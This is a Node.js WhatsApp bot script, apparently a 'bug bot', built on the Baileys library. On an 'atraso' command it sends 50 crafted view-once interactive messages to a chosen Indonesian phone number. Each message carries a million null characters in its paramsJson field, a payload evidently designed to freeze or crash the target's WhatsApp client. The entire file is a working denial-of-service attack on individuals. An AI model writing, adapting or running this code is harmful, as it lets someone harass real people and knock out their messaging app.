const { makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, delay } = require('@whiskeysockets/baileys');
const chalk = require('chalk');
const readline = require('readline');
const { Boom } = require('@hapi/boom');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState('./auth');
    const { version } = await fetchLatestBaileysVersion();
    const sock = makeWASocket({ auth: state, version });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, pairingCode } = update;
        if (connection === 'open') {
            console.log(chalk.green.bold('Bot connected successfully!'));
        } else if (pairingCode) {
            console.log(chalk.blue.bold(`Your pairing code: ${pairingCode}`));
        } else if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(chalk.red.bold('Connection closed. Reconnecting...'));
            if (shouldReconnect) {
                startBot();
            } else {
                console.log(chalk.red.bold('Logged out. Delete auth folder and restart.'));
            }
        }
    });

    sock.ev.on('messages.upsert', async (m) => {
        const msg = m.messages[0];
        if (!msg.message) return;
        const sender = msg.key.remoteJid;
        const text = msg.message.conversation || msg.message.extendedTextMessage?.text;

        // Listen for 'atraso' command
        if (text?.toLowerCase().startsWith('atraso')) {
            const parts = text.split(' ');
            const target = parts[1]; // Extract target number from the command
            if (!target) {
                await sock.sendMessage(sender, { text: 'Please provide a valid target number in the format: atraso <number>' });
                return;
            }

            // Validate number format (e.g., 62XXXXXXXXXX)
            let jid = target.replace(/[^0-9]/g, '');
            if (!jid.startsWith('62')) {
                await sock.sendMessage(sender, { text: "Invalid number! Use country code 62 for Indonesia." });
                return;
            }

            let targetJid = `${jid}@s.whatsapp.net`;
            console.log(chalk.blue.bold(`Sending atraso to ${targetJid}...`));

            // Send 50 "Atraso!" messages
            for (let i = 0; i < 50; i++) {
                await outofsync(targetJid, sock);
                await delay(1000);
            }

            console.log(chalk.green.bold('Success! Messages sent.'));
        }

        if (text?.toLowerCase() === 'ping') {
            await sock.sendMessage(sender, { text: 'Pong!' });
        }
    });
}

async function outofsync(target, sock) {
    await sock.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "@𝗱𝗲𝘃𝗼𝗿𝘀𝗶𝘅 • #𝘀𝗵𝗼𝘄𝗼𝗳𝗯𝘂𝗴 🩸",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1000000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target }});
}

startBot();
